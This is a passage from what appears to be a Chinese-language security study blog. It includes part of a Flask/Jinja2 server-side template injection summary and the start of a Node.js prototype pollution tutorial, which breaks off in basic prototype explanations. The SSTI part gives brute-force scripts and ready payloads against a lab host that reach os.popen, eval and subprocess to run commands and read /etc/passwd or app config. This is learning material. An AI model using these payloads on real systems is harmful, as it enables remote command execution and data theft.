inherited__">A</span>): <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>(<span class="hljs-title class_ inherited__">B</span>): <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span>(<span class="hljs-title class_ inherited__">B</span>): <span class="hljs-keyword">pass</span><br>c = C()<br><br><br><span class="hljs-built_in">print</span>(c.__class__) <span class="hljs-comment"># &lt;class &#x27;__main__.C&#x27;&gt;</span><br><br><span class="hljs-built_in">print</span>(c.__class__.__base__) <span class="hljs-comment"># &lt;class &#x27;__main__.B&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(c.__class__.__base__.__subclasses__()) <span class="hljs-comment"># [&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.D&#x27;&gt;]</span><br><span class="hljs-built_in">print</span>(c.__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>]) <span class="hljs-comment"># &lt;class &#x27;__main__.C&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(c.__class__.__base__.__subclasses__()[<span class="hljs-number">1</span>]) <span class="hljs-comment"># &lt;class &#x27;__main__.D&#x27;&gt;</span><br><br><span class="hljs-built_in">print</span>(c.__class__.__base__.__base__) <span class="hljs-comment"># &lt;class &#x27;__main__.A&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(c.__class__.__base__.__base__.__subclasses__()) <span class="hljs-comment"># [&lt;class &#x27;__main__.B&#x27;&gt;]</span><br><br><span class="hljs-built_in">print</span>(c.__class__.__base__.__base__.__base__) <span class="hljs-comment"># &lt;class &#x27;object&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(c.__class__.__base__.__base__.__base__.__subclasses__()) <span class="hljs-comment"># [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, ....]</span><br><span class="hljs-built_in">print</span>(c.__class__.__mro__) <span class="hljs-comment"># (&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><br></code></pre></td></tr></table></figure><p>上面代码的继承关系图如下</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">object</span><br>  |<br>  <span class="hljs-selector-tag">A</span><br>  |<br>  <span class="hljs-selector-tag">B</span><br> / \<br><span class="hljs-selector-tag">C</span>   <span class="hljs-selector-tag">D</span><br></code></pre></td></tr></table></figure><ul><li>所有类最终都继承自 object</li><li>A 是 B 的父类</li><li>B 同时有两个子类：C 和 D</li><li><code>c.__class__.__mro</code>__ 顺序为 (C, B, A, object)</li></ul><h2 id="常用注入模块"><a href="#常用注入模块" class="headerlink" title="常用注入模块"></a>常用注入模块</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stylus">os._AddedDllDirectory<br>os._wrap_close<br>_frozen_importlib._DummyModuleLock<br>_frozen_importlib._ModuleLockManager<br>_frozen_importlib<span class="hljs-selector-class">.ModuleSpec</span><br>_frozen_importlib_external<span class="hljs-selector-class">.FileLoader</span><br>_frozen_importlib_external._NamespacePath<br>_frozen_importlib_external<span class="hljs-selector-class">.ModuleSpecLoader</span><br>_frozen_importlib_external<span class="hljs-selector-class">.FileFinder</span><br>zipimport<span class="hljs-selector-class">.zipimporter</span><br>zipimport._zipimportResourceReader<br>_sitebuiltins<span class="hljs-selector-class">.Quitter</span><br>_sitebuiltins._Printer<br>warnings<span class="hljs-selector-class">.WarningMessage</span><br>warnings<span class="hljs-selector-class">.catch_warnings</span><br>weakref<span class="hljs-selector-class">.finalize</span><br>pickle._Framer<br>pickle._Unframer<br>pickle._Pickler<br>pickle._Unpickler<br>jinja2<span class="hljs-selector-class">.bccache</span><span class="hljs-selector-class">.Bucket</span><br>jinja2<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.TemplateReference</span><br>jinja2<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.Context</span><br>jinja2<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.BlockReference</span><br>jinja2<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.LoopContext</span><br>jinja2<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.Macro</span><br>jinja2<span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.Undefined</span><br>jinja2<span class="hljs-selector-class">.environment</span><span class="hljs-selector-class">.Environment</span><br>jinja2<span class="hljs-selector-class">.environment</span><span class="hljs-selector-class">.TemplateExpression</span><br>jinja2<span class="hljs-selector-class">.environment</span><span class="hljs-selector-class">.TemplateStream</span><br>dis<span class="hljs-selector-class">.Bytecode</span> <br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507140014797.png" alt="image-20250712222947629" style="zoom:50%;" /><p>上面是常用的模块，下面我们进一步讲一下如何利用：</p><ol><li><p>文件读取</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">import requests</span><br><span class="language-xml"></span><br><span class="language-xml">url = &#x27;http://192.168.230.133:18080/flaskBasedTests/jinja2/&#x27;#输入URL链接</span><br><span class="language-xml">for i in range(500):</span><br><span class="language-xml">    data = &#123;&quot;name&quot;: &quot;</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[&quot; + str(i) + &quot;]&#125;&#125;</span><span class="language-xml">&quot;&#125;</span><br><span class="language-xml">    try:</span><br><span class="language-xml">        response = requests.post(url, data=data)</span><br><span class="language-xml">        # print(response.text)</span><br><span class="language-xml">        if response.status_code == 200:</span><br><span class="language-xml">            if &#x27;_frozen_importlib_external.FileLoader&#x27; in response.text:</span><br><span class="language-xml">                print(response.text)</span><br><span class="language-xml">                print(i)</span><br><span class="language-xml">    except:</span><br><span class="language-xml">        pass</span><br><span class="language-xml"></span><br><span class="language-xml">&#x27;&#x27;&#x27;</span><br><span class="language-xml">文件读取:</span><br><span class="language-xml">需要修改URL和data</span><br><span class="language-xml">利用方式：</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[79][&quot;get_data&quot;](<span class="hljs-name">0</span>,<span class="hljs-string">&quot;/etc/passwd&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">注意：这里的79是脚本求出来的，而且脚本求的未必正确，有时候要多试几次.</span><br><span class="language-xml"></span><br><span class="language-xml">除此之外，还可以读取配置文件下的flag,如</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>内建函数eval执行命令</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">import requests<br><br>url = <span class="hljs-emphasis">&#x27;http://192.168.230.133:18080/flaskBasedTests/jinja2/&#x27;</span># 请输入URL链接<br>for i in range(500):<br><span class="hljs-code">    data = &#123;&quot;name&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot; + str(i) + &quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;&#125;</span><br><span class="hljs-code">    try:</span><br><span class="hljs-code">        response = requests.post(url, data=data)</span><br><span class="hljs-code">        # print(response.text)</span><br><span class="hljs-code">        if response.status_code == 200:</span><br><span class="hljs-code">            if &#x27;eval&#x27; in response.text:</span><br><span class="hljs-code">                # print(response.text)</span><br><span class="hljs-code">                print(i)</span><br><br><span class="hljs-code">    except:</span><br><span class="hljs-code">        pass</span><br>&#x27;&#x27;&#x27;<br>需要修改URL和data<br>利用方式：&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()[65].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>[<span class="hljs-emphasis">&#x27;__builtins__&#x27;</span>][<span class="hljs-emphasis">&#x27;eval&#x27;</span>](<span class="hljs-emphasis">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /etc/passwd&quot;).read()&#x27;</span>)&#125;&#125;<br>注意：这里的65是脚本求出来的，而且脚本求的未必正确，有时候要多试几次<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></li><li><p><code>os</code>模块执行命令</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">import requests</span><br><span class="language-xml"></span><br><span class="language-xml">url = &#x27;http://192.168.230.133:18080/flasklab/level/1&#x27;# 请输入URL链接</span><br><span class="language-xml">for i in range(500):</span><br><span class="language-xml">    data = &#123;&quot;code&quot;: &quot;</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[&quot; + str(i) + &quot;].__init__.__globals__&#125;&#125;</span><span class="language-xml">&quot;&#125;</span><br><span class="language-xml">    try:</span><br><span class="language-xml">        response = requests.post(url, data=data)</span><br><span class="language-xml">        # print(response.text)</span><br><span class="language-xml">        if response.status_code == 200:</span><br><span class="language-xml">            if &#x27;os.py&#x27; in response.text:</span><br><span class="language-xml">                # print(response.text)</span><br><span class="language-xml">                print(i)</span><br><span class="language-xml">    except:</span><br><span class="language-xml">        pass</span><br><span class="language-xml">&#x27;&#x27;&#x27;</span><br><span class="language-xml">需要修改URL和data</span><br><span class="language-xml">利用方式：</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[199].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&quot;cat /etc/passwd&quot;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">注意：这里的199是脚本求出来的，而且脚本求的未必正确，有时候要多试几次</span><br><span class="language-xml">还可以从其他函数中直接调用os模块，例如</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&quot;whoami&quot;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.os.popen</span>(<span class="hljs-name">&quot;whoami&quot;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.os.popen</span>(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p><code>importlib</code>类执行命令</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">mport requests<br><br>url = <span class="hljs-emphasis">&#x27;http://192.168.230.133:18080/flaskBasedTests/jinja2/&#x27;</span># 请输入URL链接<br>for i in range(500):<br><span class="hljs-code">    data = &#123;&quot;name&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot; + str(i) + &quot;]&#125;&#125;&quot;&#125;</span><br><span class="hljs-code">    try:</span><br><span class="hljs-code">        response = requests.post(url, data=data)</span><br><span class="hljs-code">        if response.status_code == 200:</span><br><span class="hljs-code">            if &#x27;_frozen_importlib.BuiltinImporter&#x27; in response.text:</span><br><span class="hljs-code">                print(response.text)</span><br><span class="hljs-code">                print(i)</span><br><span class="hljs-code">    except:</span><br><span class="hljs-code">        pass</span><br>&#x27;&#x27;&#x27;<br>需要修改URL和data<br>利用方式：&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls -l /opt&quot;).read()&#125;&#125;<br>注意：这里的69是脚本求出来的，而且脚本求的未必正确，有时候要多试几次<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></li><li><p><code>linecache</code>函数执行命令</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">import requests<br><br>url = <span class="hljs-emphasis">&#x27;http://192.168.230.133:18080/flaskBasedTests/jinja2/&#x27;</span># 请输入URL链接<br>for i in range(500):<br><span class="hljs-code">    data = &#123;&quot;name&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot; + str(i) + &quot;].__init__.__globals__&#125;&#125;&quot;&#125;</span><br><span class="hljs-code">    try:</span><br><span class="hljs-code">        response = requests.post(url, data=data)</span><br><span class="hljs-code">        if response.status_code == 200:</span><br><span class="hljs-code">            if &#x27;linecache&#x27; in response.text:</span><br><span class="hljs-code">                # print(response.text)</span><br><span class="hljs-code">                print(i)</span><br><span class="hljs-code">    except:</span><br><span class="hljs-code">        pass</span><br>&#x27;&#x27;&#x27;<br>需要修改URL和data<br>利用方式：&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()[191].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>[<span class="hljs-emphasis">&#x27;linecache&#x27;</span>][<span class="hljs-emphasis">&#x27;os&#x27;</span>].popen(&quot;ls -l /opt&quot;).read()&#125;&#125;<br>或者&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()[191].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.linecache.os.popen(&quot;ls -l /opt&quot;).read()&#125;&#125;<br>注意：这里的191是脚本求出来的，而且脚本求的未必正确，有时候要多试几次<br><br><br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></li><li><p><code>subprocess.Popen</code>类执行命令</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">import requests</span><br><span class="language-xml"></span><br><span class="language-xml">url = &#x27;http://192.168.230.133:18080/flaskBasedTests/jinja2/&#x27;# 请输入URL链接</span><br><span class="language-xml">for i in range(500):</span><br><span class="language-xml">    data = &#123;&quot;name&quot;: &quot;</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[&quot; + str(i) + &quot;]&#125;&#125;</span><span class="language-xml">&quot;&#125;</span><br><span class="language-xml">    try:</span><br><span class="language-xml">        response = requests.post(url, data=data)</span><br><span class="language-xml">        if response.status_code == 200:</span><br><span class="language-xml">            if &#x27;subprocess.Popen&#x27; in response.text:</span><br><span class="language-xml">                print(response.text)</span><br><span class="language-xml">                print(i)</span><br><span class="language-xml">    except:</span><br><span class="language-xml">        pass</span><br><span class="language-xml">&#x27;&#x27;&#x27;</span><br><span class="language-xml">需要修改URL和data</span><br><span class="language-xml">利用方式：</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[200](<span class="hljs-name">&#x27;ls /&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">注意：这里的200是脚本求出来的，而且脚本求的未必正确，有时候要多试几次</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li></ol><p>上面都是需要运行脚本，但是我们在第三点提过一嘴更方便的方法，就是从内置函数中直接调用os模块，例如下面几种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;config.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#125;&#125;<br><br>&#123;&#123;url_for.__globals__.os.popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>这样就不用写脚本从各个subclasses中找os模块了。</p><p>这里我们提一下常见的内置函数和内置对象</p><table><thead><tr><th align="left">类型</th><th align="left">名称&#x2F;方法</th><th align="left">描述</th><th align="left">典型用途或示例</th></tr></thead><tbody><tr><td align="left"><strong>内置函数</strong></td><td align="left"><code>lipsum</code></td><td align="left">用于生成 Lorem Ipsum 占位文本，默认提供多段随机文本。</td><td align="left">模板中填充测试内容：<code>&#123;&#123; lipsum() &#125;&#125;</code>。</td></tr><tr><td align="left"></td><td align="left"><code>url_for</code></td><td align="left">根据视图函数名生成对应的 URL 路径，支持动态参数。</td><td align="left">生成链接：<code>&lt;a href=&quot;&#123;&#123; url_for('home') &#125;&#125;&quot;&gt;Home&lt;/a&gt;</code>。</td></tr><tr><td align="left"></td><td align="left"><code>get_flashed_messages</code></td><td align="left">获取通过 <code>flash()</code> 方法设置的闪现消息，通常用于一次性提示（如成功&#x2F;错误消息）。</td><td align="left">显示消息：<code>&#123;% for msg in get_flashed_messages() %&#125;&#123;&#123; msg &#125;&#125;&#123;% endfor %&#125;</code>。</td></tr><tr><td align="left"><strong>内置对象</strong></td><td align="left"><code>cycler</code></td><td align="left">Jinja2 的循环状态管理工具，用于跟踪迭代进度（如奇偶行标记）。</td><td align="left">标记交替行：<code>&#123;% set cycle = cycler("odd", "even") %&#125;</code>。</td></tr><tr><td align="left"></td><td align="left"><code>joiner</code></td><td align="left">Jinja2 的字符串拼接工具，自动处理分隔符（如逗号）。</td><td align="left">拼接列表：&#96;</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>node.js原型链污染学习总结</title>
    <link href="/2025/07/13/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/07/13/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>原型和原型链都是来源于对象而服务于对象的概念，所以我们从对象讲起。</p><p>在 JavaScript 中，数据类型分为两大类：</p><ul><li><strong>基本类型（值类型）</strong>：如 number、string、boolean、undefined、null、symbol、bigint</li><li><strong>引用类型</strong>：如 Object、Array、Function、Date、RegExp、Error 等</li></ul><p>这里的“引用类型”，其实都是以 Object（对象）为基础的。也就是说，<strong>除了基本类型，其他在 JS 中的值本质上都是对象</strong>，数组是对象、函数是对象、正则是对象、对象还是对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> arr = [];           <span class="hljs-comment">// 数组，其实是对象</span><br><span class="hljs-keyword">let</span> fn = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;; <span class="hljs-comment">// 函数，其实也是对象</span><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;           <span class="hljs-comment">// 对象，还是对象</span><br><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>)    <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fn <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>)     <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>)    <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>JavaScript中一切引用类型都是对象</strong>，那对象是什么？</p><p>在 JavaScript 中，“对象”可以看作是<strong>一组“键值对”（属性）的无序集合</strong>。每一个属性都由“名字”（key）和“值”（value）组成：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-keyword">let</span> person <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-params">name:</span> <span class="hljs-string">&quot;matrix&quot;</span>,<br>  <span class="hljs-params">age:</span> <span class="hljs-number">20</span>,<br>  <span class="hljs-params">kid:</span> &#123;&#125;,<br>  <span class="hljs-params">say:</span> function() &#123;<br>    console.log(<span class="hljs-string">&quot;hello world&quot;</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里，<code>person</code> 对象有四个属性：<code>name</code> 、 <code>age</code>、 <code>kid</code>、 <code>say</code></p><ul><li>属性名是字符串</li><li>属性值可以是任意类型（包括对象、函数、数组、number等）</li></ul><p>所以，<strong>对象就是属性的集合</strong></p><p>现在我们知道了什么是对象，以及对象是什么，那对象是怎么创建的呢？</p><p>这就要提到构造器函数了。</p><p><strong>构造器函数（Constructor Function）</strong>：用于创建对象的普通函数，通常首字母大写。</p><p>顾名思义，构造器函数本身只是一个函数，只不过特殊一点（用来创建类的）。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> Person(<span class="hljs-type">name</span>, age) &#123;<br>  this.name = <span class="hljs-type">name</span>;<br>  this.age = age;<br>&#125;<br>console.log(<span class="hljs-built_in">new</span> Person(&quot;matrix&quot;, <span class="hljs-number">20</span>))//Person &#123; <span class="hljs-type">name</span>: <span class="hljs-string">&#x27;matrix&#x27;</span>, age: <span class="hljs-number">20</span> &#125;<br></code></pre></td></tr></table></figure><p>通过 <code>new Person(&quot;matrix&quot;, 20)</code> 创建实例对象。</p><p>这里要注意，像我们直接写出来的<code>Person</code>，不论是<code>function Person(...)&#123;...&#125;</code>还是<code>new Person(...)</code>，都是指构造器函数。</p><p>我们这里引出原型对象的概念，</p><p><strong>原型对象</strong>：每个构造函数（包括 class、普通函数）都有一个名为 <code>.prototype</code> 的属性，这个属性指向一个对象，这个对象就叫“原型对象”。</p><p>通过构造函数（或 class）<code>new</code> 出来的实例对象，都会自动把自己的 <code>__proto__</code> 属性指向构造函数的 prototype（即原型对象）。</p><p>注意，实例对象的 <code>__proto__</code> 属性与构造函数的 <code>prototype</code> 的属性都指向同一个东西，即原型对象。</p><p>（原型指的是“构造函数的 prototype 属性”，它本质上是一个对象，故称为“原型对象”。这里原型与原型对象是一个东西，只是叫法不同，不做区分）</p><p>用下面代码理解一下</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  this.name = name;<br>  this.age = age;<br>&#125;<br>let me = <span class="hljs-keyword">new</span> Person(<span class="hljs-string">&quot;matrix&quot;</span>, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me)                            <span class="hljs-comment">//Person &#123; name: &#x27;matrix&#x27;, age: 20 &#125;</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.__proto__)                  <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(Person.prototype)              <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.__proto__.constructor)      <span class="hljs-comment">//[Function: Person]</span><br></code></pre></td></tr></table></figure><p>可以发现，实例对象me的 <code>__proto__</code> 属性与构造函数Person的 <code>prototype</code> 的属性都指向一个空对象，但是这个空对象有一个默认的 constructor 属性指回Person 函数本身。</p><p>我们知道了实例对象me的原型对象，那原型对象的原型是啥？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 